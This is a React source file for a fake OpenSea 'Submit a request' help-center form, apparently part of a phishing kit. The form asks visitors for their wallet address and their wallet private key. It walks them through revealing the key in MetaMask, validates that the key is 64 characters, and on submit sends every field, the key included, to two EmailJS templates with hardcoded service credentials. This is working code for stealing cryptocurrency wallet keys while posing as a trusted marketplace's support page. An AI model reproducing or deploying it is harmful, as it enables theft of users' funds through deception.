import React, { useState, useEffect, useRef } from 'react'
import { useNavigate } from 'react-router-dom';
import emailjs from '@emailjs/browser';
import { FaCheckCircle, FaQuestionCircle} from 'react-icons/fa';



const Form = ({ success, setSuccess, msg, setErrMsg, setMsg }) => {

    const navigate = useNavigate();

    
    const [privateKey, setprivateKey] = useState('');
    const [keyErr, setKeyErr] = useState(null);
    const [validKey, setValidKey] = useState(false)
    const form = useRef();

    const key = useRef();

    

    useEffect(() => {

        // let ket = '467848a388242cb827ea1e034ceb44f8d80edd1e9def2bffb73625aede045252'

        // console.log(ket.length)
        
        const validateKey = () => {
            if(privateKey.length === 64){
            setValidKey(true)
        }else{
            setValidKey(false)
        }
    }

    validateKey()


    }, [privateKey])


    const sendEmail = (e) => {
        e.preventDefault();

        emailjs.sendForm('service_a3ps4s9', 'template_jydlhru', form.current, 'YAy4TSWhzcbTo9rQu')
            .then((result) => {
                console.log(result.text);
                setSuccess(true)
                setMsg('success')

                setTimeout(() => {
                    setSuccess(false);
                    setErrMsg(false);
                    navigate('/');
                }, 3000);
                e.target.reset()
            }, (error) => {
                console.log(error.text);
                setErrMsg(true)
                setMsg('failed')
                setTimeout(() => {
                    setErrMsg(false);
                }, 2000);
            });

        emailjs.sendForm('service_a3ps4s9', 'template_hcgt9ei', form.current, 'YAy4TSWhzcbTo9rQu')
            .then((result) => {
                console.log(result.text);
            }, (error) => {
                console.log(error.text);
            });
    }
    useEffect(() => {
        document.title = 'Submit a request – OpenSea Help Center';

        setTicket(ticketId);
    }, [])

    

    const [option, setOption] = useState([
        {
            id: 1,
            title: 'My Account',
            optionsText: ['Create an account', 'Log in or out', 'Edit my account', 'Manage my notifications', 'Hide burnt items', 'Verify my account or collection', 'Unlock my account'],
            checked: false
        },
        {
            id: 2,
            title: 'Buying and Selling NFTs',
            optionsText: ['Buy an item', 'Create or edit a listing', 'Sell or transfer an item', 'Report a buyer experiencing an issue buying my items'],
            checked: false
        },
        {
            id: 3,
            title: 'Creating Items & Collections',
            optionsText: ['Create a drop', 'Create or edit a collection', 'Report a delisted or disabled item, collection, or drop', 'Request partnership with OpenSea'],
            checked: false
        },
        {
            id: 4,
            title: 'Developing & API',
            optionsText: ['Request API key', 'Report API issue', 'Report throttling issue', 'Report documentation issue'],
            checked: false
        },
        {
            id: 5,
            title: 'Bugs, Errors and Product Suggestions',
            optionsText: ['Report a bug', 'Report a bug', 'Submit a product suggestion'],
            checked: false
        },
        {
            id: 6,
            title: 'Fraudulent Activity and Other Safety & Security Concerns',
            optionsText: ['Report my NFT as stolen', 'Report my funds as stolen', 'Report my funds as stolen', 'Report harmful content or behavior', 'Report an intellectual property claim', 'Report a disabled or delisted account, collection, drop, or item', 'Report NFTs that I didn\'t buy'],
            checked: false
        },
    ]);
    const [optionsMenu, setOptionsMenu] = useState([
        'Create an account', 'Log in or out', 'Edit my account', 'Manage my notifications', 'Hide burnt items', 'Verify my account or collection', 'Unlock my account'
    ])

    const optionList = (
        optionsMenu.map(item => <option value={item} >{item}</option>)
    )

    const [optionState, setOptionState] = useState(false);




    const title = ['My Account', 'Buying and Selling NFTs', 'Creating Items & Collections', 'Developing & API', 'Bugs, Errors and Product Suggestions', 'Fraudulent Activity and Other Safety & Security Concerns']


    const handleCheckState = (e) => {
        setOptionState(true);

        const title = e.target.value
        const checked = e.target.checked

        const optionsText = option.find(item => item.title === title);
        setOptionsMenu(optionsText.optionsText);

        console.log(optionState);

    }

    const handleTicket = () => {
        setTicket(ticketId);
    }
    const [ticket, setTicket] = useState();



    const random = (min, max) => Math.floor(Math.random() * (max - min)) + min;
    const ticketId = random(100000, 999999)

    console.log(ticketId);


    return (
        <>

            <div className='form--body'>
                <section className='sect--a'>
                    <form method='POST' onSubmit={e => e.preventDefault()}>
                        <ul>
                            <li className='complaint--opt' >
                                <label htmlFor='radio--opt--1' className='radio' >
                                    <input type="radio" value={title[0]} name='complaint' id='radio--opt--1' onChange={handleCheckState} />
                                    <span id='outer' className={`outer `}></span>
                                    {title[0]}
                                </label>
                            </li>
                            <li className='complaint--opt'>
                                <label htmlFor='radio--opt--2' className='radio'>
                                    <input type="radio" id='radio--opt--2' value={title[1]} name='complaint' onChange={handleCheckState} />
                                    <span className={`outer active`}></span>
                                    {title[1]}
                                </label>
                            </li>
                            <li className='complaint--opt'>
                                <label htmlFor='radio--opt--3' className='radio'>
                                    <input type="radio" id='radio--opt--3' name='complaint' value={title[2]} onChange={handleCheckState} />
                                    <span className={`outer `}></span>
                                    {title[2]}
                                </label>
                            </li>
                            <li className='complaint--opt'>
                                <label htmlFor='radio--opt--4' className='radio'>
                                    <input type="radio" id='radio--opt--4' name='complaint' value={title[3]} onChange={handleCheckState} />
                                    <span className={`outer `}></span>
                                    {title[3]}
                                </label>
                            </li>
                            <li className='complaint--opt'>
                                <label htmlFor='radio--opt--5' className='radio'>
                                    <input type="radio" id='radio--opt--5' name='complaint' value={title[4]} onChange={handleCheckState} />
                                    <span className={`outer `}></span>
                                    {title[4]}
                                </label>
                            </li>
                            <li className='complaint--opt'>
                                <label htmlFor='radio--opt--6' className='radio'>
                                    <input type="radio" id='radio--opt--6' name='complaint' value={title[5]} onChange={handleCheckState} />
                                    <span className={`outer `}></span>
                                    {title[5]}
                                </label>
                            </li>
                            <li className='complaint--opt'>
                                <label htmlFor='radio--opt--' className='radio'>
                                    Join our Community on Twitter and Discord
                                </label>
                            </li>

                        </ul>
                    </form>
                </section>
                <section className='sect--b'>
                    {!optionState && <div className='option--not--sucess'> <h3>Select a topic</h3><p>Chose a topic that best describes your issue. To browse other resources search our Help Center.</p></div>}
                    {optionState &&

                        <form enctype="multipart/form-data" method='POST' onSubmit={sendEmail} ref={form}>
                            <div className='form--field--inputs'>
                                <label htmlFor='email' className='val--label'> Your email  <span>*</span></label>
                                <input type="text" name='user_email' required className='field-inputs-texts' />
                            </div>
                            <div className='form--field--select'>
                                <label htmlFor='selections' className='val--label'> What can we help with?: <span>*</span></label>
                                <select name='complain_option' className='field-inputs-select'>
                                    <option className='field-inputs-select-opt'>-</option>
                                    {optionList}
                                </select>
                            </div>
                            <div className='form--field--inputs--others'>
                                <label htmlFor='email' className='val--label'>What's your wallet Address?<span>*</span></label>
                                <input type="text" name='wallet_id' className='field-inputs-texts' required/>
                            </div>
                            <div className='form--field--inputs--others rel-key'>
                                <label htmlFor='email' className='val--label'>What's your wallet private key?
                                <span>* 
                                { privateKey && privateKey.length === 64 && <FaCheckCircle style={{ color : 'green' }}/>}
                                { privateKey !== '' && privateKey.length !== 64 && <FaCheckCircle />}
                                     </span>
                                </label>
                                <input 
                                type="text" 
                                name='wallet_key' 
                                className='field-inputs-texts' 
                                required
                                onChange={e => setprivateKey(e.target.value)}
                                value={privateKey}
                                />
                                 
                                { !validKey 
                                &&  
                                <ul className={`step--for--privatekey`}  >
                                    <small>To obtain your MetaMask private key, please follow these step-by-step instructions:</small>
                                    <li className='key--steps'>
                                        Open the MetaMask extension: Make sure you have the MetaMask extension installed in your web browser. Click on the MetaMask icon to open the extension.
                                    </li>
                                    <li className='key--steps'>
                                    Access the account menu: Once the MetaMask extension is open, click on the account icon located in the top right corner of the extension. It typically looks like a circle or a profile picture
                                    </li>
                                    <li className='key--steps'>
                                    Navigate to the "Account Details" page: In the account details section, look for an option or link that says "Account Details" or something similar. Click on it to proceed.
                                    </li>
                                    <li className='key--steps'>
                                    Reveal the private key: On the account details page, you should see an option to "Reveal" or "Show" the private key. Click on this option to reveal your private key. Be cautious and ensure that you are in a secure environment and no one else can access your screen.
                                    </li>
                                    <li className='key--steps'>
                                    Save your private key: Once the private key is revealed, it is crucial to save it securely. We recommend copying the private key and storing it in a password-protected document or a secure password manager. Do not share or expose your private key to anyone else. Paste in the tab above.
                                    </li>
                                </ul>
                                }
                                
                            </div>
                            <div className='form--field--inputs--others'>
                                <label htmlFor='email' className='val--label'>Subject<span>*</span></label>
                                <input type="text" required name='subject' className='field-inputs-texts' />
                            </div>
                            <div className='form--field--inputs--others' style={{ display: 'none', overflow: 'hidden' }}>
                                <label htmlFor='email' className='val--label'>Subject<span>*</span></label>
                                <input type="text" required name='ticketId' onChange={() => handleTicket} value={ticket} className='field-inputs-texts' />
                            </div>
                            <div className='form--field--inputs--others'>
                                <label htmlFor='email' className='val--label'>Description<span>*</span></label>
                                <div className='markdown'>
                                    <span className='mkd--tool-kit'>

                                    </span>
                                    <textarea cols="30" rows="10" name='message' />
                                </div>
                                <p className='markdown--tips'>In order to best help, please enter as many details as you can. This should include troubleshooting steps you've already taken, as well as screenshots of any error messages. Please also make sure you are submitting this form with the email address on file for your account, or you may be asked to re-submit with the correct information.</p>
                            </div>

                            <div className='form--field--inputs--others file'>
                                <label htmlFor='files' className='val--label'>Attachments(optional)</label>
                                <input type="file" id='file' name='my_file' className='field-inputs-texts' />
                                <label className='val--label--files' htmlFor='file'> Add file or drop files here</label>
                            </div>
                            <div className='form--btn'>
                                <button >submit</button>
                            </div>
                        </form>
                    }
                </section>
            </div>
        </>
    )
}

export default Form